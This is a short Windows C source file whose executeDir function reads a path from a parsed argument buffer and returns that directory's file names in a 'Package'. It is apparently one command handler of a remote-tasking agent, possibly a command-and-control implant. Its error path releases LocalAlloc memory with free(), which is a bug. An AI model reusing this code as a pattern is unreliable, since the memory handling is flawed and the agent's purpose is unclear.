#include "Dir.h"
#include "Package.h"

PPackage executeDir(PParser arguments)
{
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR path = getString(arguments, &size); // will read first UINT32 as size of param
	path = (PCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!path)
	{
		_err("[DIR] Error in executeDir command");
		return NULL;
	}

	PPackage output = newPackage(0, FALSE);

	// Create search pattern with wilcard (all files in dir)
	PCHAR searchPattern = (PCHAR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 2) * sizeof(CHAR));
	snprintf(searchPattern, MAX_PATH + 2, "%s\\*", path);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(searchPattern, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		_err("[DIR] Error in executeDir command");
		freePackage(output);
		free(searchPattern);
		free(path);
		return NULL;
	}
	do
	{
		addString(output, FindFileData.cFileName, FALSE);
	} while (FindNextFile(hFind, &FindFileData) != 0);

	FindClose(hFind);
	LocalFree(searchPattern);
	LocalFree(path);
	return output;
}
